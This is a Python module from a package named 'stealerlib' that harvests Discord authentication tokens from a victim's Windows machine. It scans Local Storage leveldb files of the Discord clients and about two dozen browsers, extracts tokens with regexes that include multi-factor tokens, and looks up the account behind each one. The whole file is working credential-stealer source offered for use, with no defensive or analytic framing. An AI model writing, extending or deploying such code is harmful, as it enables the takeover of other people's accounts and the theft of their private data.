#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author:  codeuk
    @package: stealerlib/apps/discord/__init__.py
"""

import os
import re

from dataclasses import dataclass
from typing import Union, Optional

from stealerlib.exceptions import catch

from stealerlib.apps.discord.types import DiscordTypes


class Discord:
    """This class provides methods for extracting and decrypting information from the local Discord and browser databases

    Attributes:
        tokens      A list of plaintext Discord tokens gathered from all available paths (self.available)
        accounts    A list of account information collected from each Discord token stored in a list of values or a StealerLib object
        roaming     The path to the local roaming folder
        appdata     The path to the local appdata folder
        locations   A dictionary of file paths where Discord tokens are stored
        available   A list of file paths that exist on the local machine (derived from self.locations)
    """

    def __init__(self):
        self.tokens = []
        self.accounts = []
        self.roaming = roaming = os.getenv("appdata")
        self.appdata = appdata = os.getenv("localappdata")
        self.locations = {
            'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }
        self.available = self.get_available_paths()

    def get_available_paths(self) -> list:
        """Iterated through each available Discord-related path where tokens could be found and checks if it exists

        Parameters:
            self (object): The object passed to the method

        Returns:
            list: A list of the gathered paths that exist on the local machine
        """

        available_paths = []
        for path in self.locations.values():
            if not os.path.exists(path):
                continue
            available_paths.append(path)

        return available_paths

    @catch
    def get_tokens(
        self,
        conv: Optional[bool]=True
    ) -> list[Union[str, DiscordTypes.Token]]:
        """Iterates through each of the available paths and decrypt the Discord tokens stored in them

        Parameters:
            self (object): The object passed to the method
            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object

        Returns:
            list: A list of scraped Discord tokens from the machine as plaintext or a StealerLib object
        """

        enc_regex = r"mfa\.[\w-]{84}"
        def_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"

        strip_lines = lambda path, file: [
            line.strip()
            for line in open(f"{path}\\{file}", errors="ignore").readlines()
            if line.strip()
        ]

        for path in self.available:
            for file in os.listdir(path):
                if not file.endswith(".log") and not file.endswith(".ldb"):
                    continue
                for line in strip_lines(path, file):
                    for regex in (def_regex, enc_regex):
                        for token in re.findall(regex, line):
                            if token not in self.tokens:
                                self.tokens.append(
                                    token if conv else DiscordTypes.Token(token) 
                                )

        return self.tokens

    @catch
    def get_token_information(
        self,
        tokens: list[Union[str, DiscordTypes.Token]],
        conv: Optional[bool]=True
    ) -> list[Union[list, DiscordTypes.Account]]:
        """Iterates through each token and calls the get_information function -
           on the either supplied or newly-created StealerLib object

        Parameters:
            self (object): The object passed to the method
            tokens (list): A list of plaintext tokens or DiscordTypes.Token objects to get the information of
            conv (bool): Boolean whether to append the data as a converted list of values or a StealerLib object

        Returns:
            list: A list containing each tokens account information, stored in another list or a StealerLib object
        """

        for token in tokens:
            if not isinstance(token, DiscordTypes.Token):
                token = DiscordTypes.Token(token)

            obj_account = token.get_information()
            self.accounts.append(
                obj_account.conv() if conv else obj_account
            )

        return self.accounts


if __name__ == '__main__':
    discord = Discord()
    discord.get_tokens()
    print(discord.tokens)